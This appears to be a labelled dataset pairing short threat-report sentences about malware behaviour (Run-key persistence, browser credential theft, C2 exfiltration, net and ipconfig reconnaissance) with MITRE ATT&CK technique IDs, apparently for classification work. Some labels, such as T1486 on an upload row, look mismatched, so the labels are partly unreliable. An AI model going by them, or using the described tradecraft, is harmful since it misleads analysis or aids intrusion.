text1	labels
can collect system information, including computer name, system manufacturer, IsDebuggerPresent state, and execution path.	['T1082', 'T1082']
FIN6 conducted internal reconnaissance with a Windows batch file leveraging Adfind to query Active Directory, then 7-zip to compress the results for exfiltration	['T1018', 'T1069']
, a tool that has been used by adversaries, writes programs to the ADMIN$ network share to execute commands on remote systems.	['T1021.002']
achieves persistence by creating a shortcut in the Startup folder.	['T1547.009', 'T1547.001']
achieves persistence by using various Registry Run keys.	['T1547.001']
A  configuration file is encrypted with a simple XOR key, 0x53.	['T1027']
actors deleted tools and batch files from victim systems.	['T1070.004']
actors installed a credential logger on Microsoft Exchange servers.  also leveraged the reconnaissance framework, ScanBox, to capture keystrokes.	['T1056']
actors mapped network drives using net use.	['T1021.002']
actors used the following command after exploiting a machine with  malware to acquire information about local networks: ipconfig /all >> %temp%\download	['T1016']
actors used the following command following exploitation of a machine with  malware to list local groups: net localgroup administrator >> %temp%\download	['T1069']
added the registry value ntdll to the Registry Run key to establish persistence.	['T1547.001']
adds a sub-key under several Registry run keys.	['T1547.001']
adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.	['T1560', 'T1486', 'T1074']
adds itself to the startup folder or adds itself to the Registry key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.	['T1547.001']
adds permissions and remote logins to all users.	['T1098']
adds the setuid flag to a binary so it can easily elevate in the future.	['T1548.001']
Adversaries can direct  to upload files to the C2 Server.	['T1041']
After collecting documents from removable media,  compresses the collected files.	['T1560']
After compromising a victim,  discovers all running services.	['T1007']
After data is collected by  malware, it is exfiltrated over the existing C2 channel.	['T1041']
A module in  collects information about the paths, size, and creation time of files with specific file extensions, but not the actual content of the file.	['T1083']
A module in  gathers logins and passwords stored in applications on the victims, including Google Chrome, Mozilla Firefox, and several other browsers.	['T1552.001']
An  downloader establishes SOCKS5 connections to two separate IP addresses over TCP port 1913 and TCP port 81.	['T1571']
An  loader Trojan saves its payload with hidden file attributes.	['T1564.001']
appears to have functionality to sniff for credentials passed over HTTP, SMTP, and SMB.	['T1040']
A  tool can create a new Registry key under HKEY_CURRENT_USER\Software\Classes\.	['T1112']
automatically collects data about the victim and sends it to the control server.	['T1119']
A  variant accesses a screenshot saved in the clipboard and converts it to a JPG image.	['T1115']
